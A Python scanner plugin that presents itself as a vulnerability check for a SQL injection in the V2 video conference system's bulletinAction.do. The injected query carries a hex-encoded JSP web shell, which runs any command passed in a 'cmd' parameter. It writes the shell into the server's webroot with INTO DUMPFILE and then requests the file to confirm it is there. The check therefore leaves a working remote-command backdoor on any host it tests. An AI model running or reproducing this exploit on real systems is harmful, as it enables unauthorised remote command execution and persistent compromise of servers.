#!/usr/bin/env python3

import asyncio
import requests
from app.lib.common import get_useragent

class V2_BulletinAction_Sql_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'V2视频会议系统 bulletinAction.do SQL注入漏洞',
            'description': 'V2视频会议系统 bulletinAction.do SQL注入漏洞',
            'date': '2016-05-27',
            'exptype': 'check',
            'type': 'SQL'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent()
        }

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        exp_url = self.url + "/Conf/jsp/systembulletin/bulletinAction.do?operator=modify&sysId=1 UNION SELECT 1,2,3,4,0x497420776F726B7321DA3C2540207061676520636F6E74656E74547970653D22746578742F68746D6C3B20636861727365743D47424B2220253EDA3C2540207061676520696D706F72743D226A6176612E696F2E2A2220253E203C2520537472696E6720636D64203D20726571756573742E676574506172616D657465722822636D6422293B20537472696E67206F7574707574203D2022223B20696628636D6420213D206E756C6C29207B20537472696E672073203D206E756C6C3B20747279207B2050726F636573732070203D2052756E74696D652E67657452756E74696D6528292E6578656328636D64293B204275666665726564526561646572207349203D206E6577204275666665726564526561646572286E657720496E70757453747265616D52656164657228702E676574496E70757453747265616D282929293B207768696C65282873203D2073492E726561644C696E6528292920213D206E756C6C29207B206F7574707574202B3D2073202B225C725C6E223B207D207D20636174636828494F457863657074696F6E206529207B20652E7072696E74537461636B547261636528293B207D207DDA6F75742E7072696E746C6E286F7574707574293B253EDA into dumpfile '../../management/webapps/root/V2ConferenceCmd.jsp'%23"
        check_url = self.url + '/V2ConferenceCmd.jsp'
        try:
            req = requests.session()
            exp_resp = req.get(exp_url, headers = self.headers)
            await asyncio.sleep(2)
            if exp_resp.status_code == 200:
                check_resp = req.get(check_url, headers = self.headers)
                if check_resp.status_code == 200 and "It works!" in check_resp.text:
                    # print('存在V2视频会议系统 bulletinAction.do SQL注入漏洞')
                    return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    V2_BulletinAction_Sql = V2_BulletinAction_Sql_BaseVerify('https://127.0.0.1')
    V2_BulletinAction_Sql.check()